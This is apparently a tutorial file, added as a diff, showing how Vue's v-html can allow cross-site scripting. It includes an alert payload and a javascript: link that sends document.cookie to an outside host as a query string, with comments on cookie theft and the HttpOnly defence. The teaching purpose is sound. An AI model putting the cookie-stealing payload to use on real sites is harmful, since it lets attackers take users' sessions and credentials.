@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <!-- 引入 Vue 全局變量 -->
+    <script src="https://unpkg.com/vue@next"></script>
+
+</head>
+
+<body>
+    <div class="box">
+        <!-- 使用 v-html 後 vue 會自動的 render 資料(也可以解析 html DOM) -->
+        <span v-html="html_str"></span>
+
+        <!-- !! 使用 v-html 有可能會遭受 xss 攻擊 -->
+        <!-- 跨站腳本攻擊（Cross-site scripting，XSS）是一种安全漏洞，攻擊者可以利用这種漏洞在網站上注入恶意的用戶端代碼。 -->
+        <!-- demo 一個簡單的 xss 攻擊 (將 javascript 放入 a 標籤)-->
+        <span v-html="xss_str">我是一段可以執行 xss 攻擊的 DOM</span> <br>
+
+        <span v-html="cookie_str"></span>
+    </div>
+    <script>
+        const app = Vue.createApp({
+            data() {
+                return {
+                    html_str: '<div class="content">我是透過 v-html render 出來的</div>',
+                    xss_str: "<a href=\"javascript:alert('你被 xss 攻擊了')\">點我點我</a>",
+
+                    // 更進階的 攜帶當前網站的 cookie 例如 : 使用者帳密 
+                    // ? 代表服務器攜帶參數 + 後面攜帶 cookie 資訊
+                    cookie_str:  '<a href=javascript:location.href="http://www.google.com?"+document.cookie>快點我</a>',
+                    // 如果點擊 a 時 google 的網站會顯示 https://www.google.com/?location_a=10;%20location_b=20 
+                    // 其中 ?location_a=10;%20location_b=20 就是傳過去的 參數
+                    // 但通常在使用 cookie 有一項屬性是 'HttpOnly' 可以限制 該 cookie 不會被 document.cookie 抓取
+                }
+            },
+
+        });
+        app.mount('.box');
+    </script>
+
+</body>
+
+</html>
